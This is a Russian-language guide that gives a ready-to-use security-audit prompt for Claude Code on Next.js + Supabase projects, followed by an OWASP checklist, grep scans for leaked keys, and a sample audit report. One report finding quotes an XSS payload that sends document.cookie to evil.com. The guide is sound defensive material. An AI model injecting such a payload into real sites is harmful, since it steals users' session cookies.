# 4-23 | Security Review Prompt — Аудит безопасности

> **Тип:** Instruction
> **Когда использовать:** Перед деплоем в production, после code review (4-22)
> **Результат:** Список уязвимостей с severity и конкретными исправлениями

---

## Философия этого документа

Этот файл — **готовый промпт для Claude Code**. Вы не пишете его сами — копируете и используете.

**Принцип работы:**
- Вы — архитектор и коммуникатор
- Claude Code — исполнитель: читает промпт, делает работу
- Ваша задача — запустить аудит перед деплоем и разобрать результат

**Workflow:**
```
Вы → копируете промпт → вставляете в Claude Code (VS Code)
       ↓
       проект готов к аудиту (код + схема БД + .env на месте)
       ↓
Claude Code → проходит по OWASP-чеклисту, выдаёт отчёт по severity
       ↓
Вы → чините critical/high → повторяете аудит → деплоите
```

Промпт уже отлажен. Не нужно его улучшать с первого раза — просто используйте.

---

## Что это такое

Промпт для проведения security-аудита проекта на стеке Next.js + Supabase. Основан на OWASP Top 10, адаптирован под специфику нашего стека. Проверяет RLS, переменные окружения, инъекции, XSS, аутентификацию, API-ключи, CORS.

**Это НЕ опционально.** Каждый проект проходит security review перед production.

---

## Промпт для копирования

```
Проведи security audit проекта. Проверь каждую категорию ниже.

## 1. Row Level Security (RLS) — Supabase

Для КАЖДОЙ таблицы в Supabase проверь:
- [ ] RLS включён (ALTER TABLE ... ENABLE ROW LEVEL SECURITY)
- [ ] Есть политики на SELECT, INSERT, UPDATE, DELETE
- [ ] Политики используют auth.uid() для фильтрации по пользователю
- [ ] Нет политик с USING (true) — это открывает данные всем
- [ ] Service role key НЕ используется на клиенте (только anon key)
- [ ] Нет таблиц без единой политики (данные недоступны, но это баг)

Проверь через SQL:
```sql
SELECT schemaname, tablename, rowsecurity
FROM pg_tables
WHERE schemaname = 'public';

SELECT tablename, policyname, permissive, roles, cmd, qual
FROM pg_policies
WHERE schemaname = 'public';
```

## 2. Переменные окружения

- [ ] .env.local в .gitignore
- [ ] Никакие секреты не попали в git историю (git log -p | grep -i "key\|secret\|password\|token")
- [ ] NEXT_PUBLIC_ переменные не содержат секретов
- [ ] SUPABASE_SERVICE_ROLE_KEY используется ТОЛЬКО в Server Actions / API routes
- [ ] Все ключи из .env.local.example имеют placeholder-значения, не реальные

Проверь:
```bash
# Что видно клиенту
grep -rn "NEXT_PUBLIC_" src/ --include="*.ts" --include="*.tsx"

# Service role на клиенте — КРИТИЧЕСКАЯ уязвимость
grep -rn "SERVICE_ROLE\|service_role" src/ --include="*.ts" --include="*.tsx"

# Hardcoded ключи
grep -rn "eyJ\|sk-\|pk_\|sk_live\|supabase\.co" src/ --include="*.ts" --include="*.tsx"
```

## 3. SQL Injection

- [ ] Все запросы используют Supabase client (параметризованные)
- [ ] Нет сырых SQL-строк с конкатенацией пользовательского ввода
- [ ] Если используется supabase.rpc() — параметры передаются через args
- [ ] Нет template literals в SQL: `SELECT * FROM ${table}` — УЯЗВИМОСТЬ

Проверь:
```bash
grep -rn "\.rpc\|\.sql\|execute.*sql" src/ --include="*.ts"
```

## 4. XSS (Cross-Site Scripting)

- [ ] Нет dangerouslySetInnerHTML (или есть с DOMPurify санитизацией)
- [ ] Пользовательский ввод экранируется при рендере
- [ ] URL-параметры валидируются перед использованием
- [ ] Content-Security-Policy заголовок настроен в next.config.ts

Проверь:
```bash
grep -rn "dangerouslySetInnerHTML\|innerHTML" src/ --include="*.tsx"
```

## 5. CSRF (Cross-Site Request Forgery)

- [ ] Server Actions автоматически защищены Next.js (проверь что используются)
- [ ] API routes проверяют Origin/Referer заголовки
- [ ] Нет GET-запросов, которые изменяют данные

## 6. Аутентификация и авторизация

- [ ] Все защищённые страницы проверяют сессию в middleware.ts
- [ ] Server Actions проверяют auth.uid() перед операциями
- [ ] API routes проверяют аутентификацию
- [ ] Нет страниц с данными, доступных без логина
- [ ] Redirect на /login для неаутентифицированных пользователей
- [ ] Logout очищает сессию корректно

Проверь:
```bash
# Middleware существует и правильно настроен
cat src/middleware.ts

# Server Actions проверяют пользователя
grep -rn "getUser\|auth\(\)" src/app/actions/ --include="*.ts"
```

## 7. API Key Leaks

- [ ] Никакие API ключи не hardcoded в коде
- [ ] API ключи третьих сервисов только в .env.local
- [ ] Нет ключей в комментариях или TODO
- [ ] git-secrets или подобный инструмент настроен

## 8. CORS Configuration

- [ ] API routes не возвращают Access-Control-Allow-Origin: *
- [ ] CORS настроен только для нужных доменов
- [ ] Preflight (OPTIONS) запросы обрабатываются корректно

Проверь:
```bash
grep -rn "Access-Control\|cors\|CORS" src/ --include="*.ts"
```

## 9. Rate Limiting

- [ ] API routes имеют rate limiting (или план его добавить)
- [ ] Форма логина защищена от брутфорса
- [ ] Публичные endpoints не позволяют бесконечные запросы

## 10. Зависимости

- [ ] npm audit не показывает critical уязвимостей
- [ ] Нет устаревших пакетов с известными CVE
- [ ] lockfile (package-lock.json) закоммичен

Проверь:
```bash
npm audit --audit-level=high
```

## Формат отчёта

Для каждой уязвимости:
- **ID:** SEC-001, SEC-002...
- **Категория:** RLS | ENV | SQLi | XSS | CSRF | Auth | Keys | CORS | RateLimit | Deps
- **Severity:** CRITICAL / HIGH / MEDIUM / LOW
- **Описание:** что найдено
- **Файл:** путь и строка
- **Exploit сценарий:** как злоумышленник может использовать
- **Исправление:** конкретный код

Исправь все CRITICAL и HIGH немедленно. MEDIUM — создай TODO. LOW — задокументируй.
```

---

## Пример результата для TaskFlow

```markdown
# Security Audit — TaskFlow

Дата: 2026-04-10
Severity Summary: 1 CRITICAL, 2 HIGH, 2 MEDIUM, 1 LOW

---

## SEC-001 | CRITICAL | RLS отсутствует на таблице task_comments

- **Категория:** RLS
- **Файл:** Supabase → таблица task_comments
- **Описание:** Таблица task_comments имеет RLS включённый, но нет ни одной политики. Результат — все данные заблокированы для anon, но при добавлении политики можно случайно открыть доступ ко всем записям.
- **Exploit:** Если разработчик добавит политику USING (true) для быстрого фикса — комментарии всех пользователей станут публичными.
- **Исправление:**
```sql
CREATE POLICY "Users can read own task comments"
ON task_comments FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM tasks
    WHERE tasks.id = task_comments.task_id
    AND tasks.user_id = auth.uid()
  )
);

CREATE POLICY "Users can insert own task comments"
ON task_comments FOR INSERT
WITH CHECK (
  EXISTS (
    SELECT 1 FROM tasks
    WHERE tasks.id = task_comments.task_id
    AND tasks.user_id = auth.uid()
  )
);
```

---

## SEC-002 | HIGH | Service role key доступен на клиенте

- **Категория:** ENV
- **Файл:** src/lib/supabase/client.ts:5
- **Описание:** `NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY` — service role ключ доступен в браузере. Это даёт полный доступ к БД в обход RLS.
- **Exploit:** Любой пользователь может открыть DevTools → Network, скопировать ключ, и напрямую обращаться к Supabase API с полными правами.
- **Исправление:**
  1. Переименовать в `SUPABASE_SERVICE_ROLE_KEY` (без NEXT_PUBLIC_)
  2. Использовать только в Server Actions
  3. Клиентский Supabase — только с `NEXT_PUBLIC_SUPABASE_ANON_KEY`

---

## SEC-003 | HIGH | dangerouslySetInnerHTML без санитизации

- **Категория:** XSS
- **Файл:** src/components/tasks/TaskDescription.tsx:18
- **Описание:** Описание задачи рендерится через dangerouslySetInnerHTML без DOMPurify
- **Exploit:** Пользователь вставляет `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">` в описание задачи
- **Исправление:**
```typescript
import DOMPurify from 'isomorphic-dompurify'

// БЫЛО
<div dangerouslySetInnerHTML={{ __html: task.description }} />

// СТАЛО
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(task.description)
}} />
```

---

## SEC-004 | MEDIUM | Нет rate limiting на API

- **Категория:** RateLimit
- **Описание:** Публичные API routes не имеют rate limiting
- **TODO:** Добавить middleware с rate limiting (upstash/ratelimit)

## SEC-005 | MEDIUM | npm audit показывает 2 moderate уязвимости

- **Категория:** Deps
- **Описание:** Устаревшие транзитивные зависимости
- **TODO:** `npm audit fix`

## SEC-006 | LOW | Нет Content-Security-Policy

- **Категория:** XSS
- **Описание:** next.config.ts не содержит CSP заголовков
- **Рекомендация:** Добавить базовый CSP в production
```

---

## OWASP Top 10 → наш стек

| OWASP | Наш стек (Next.js + Supabase) | Как проверяем |
|-------|-------------------------------|---------------|
| A01 Broken Access Control | RLS-политики, middleware.ts | SQL-запросы к pg_policies |
| A02 Cryptographic Failures | Supabase Auth (bcrypt), HTTPS | Автоматически |
| A03 Injection | Supabase client (параметризация) | grep по сырым SQL |
| A04 Insecure Design | Spec review (edge cases) | Ручная проверка SPEC.md |
| A05 Security Misconfiguration | .env, CORS, headers | grep по конфигам |
| A06 Vulnerable Components | npm audit | `npm audit` |
| A07 Auth Failures | Supabase Auth, middleware | grep по auth проверкам |
| A08 Data Integrity | Server Actions (CSRF protection) | Архитектурная проверка |
| A09 Logging Failures | console.log вместо structured logs | grep по логированию |
| A10 SSRF | API routes с внешними запросами | grep по fetch/axios |

---

## Быстрый security-скан (5 минут)

```bash
# Критические проверки — запусти все
grep -rn "SERVICE_ROLE\|service_role" src/ --include="*.ts" --include="*.tsx"
grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx"
grep -rn "NEXT_PUBLIC_.*KEY\|NEXT_PUBLIC_.*SECRET" .env*
grep -rn "eyJ\|sk-\|pk_live\|sk_live" src/ --include="*.ts" --include="*.tsx"
npm audit --audit-level=high 2>/dev/null
```

---

*Безопасность подтверждена? Переходи к деплою. Нашёл проблемы? Исправь и перезапусти этот review.*
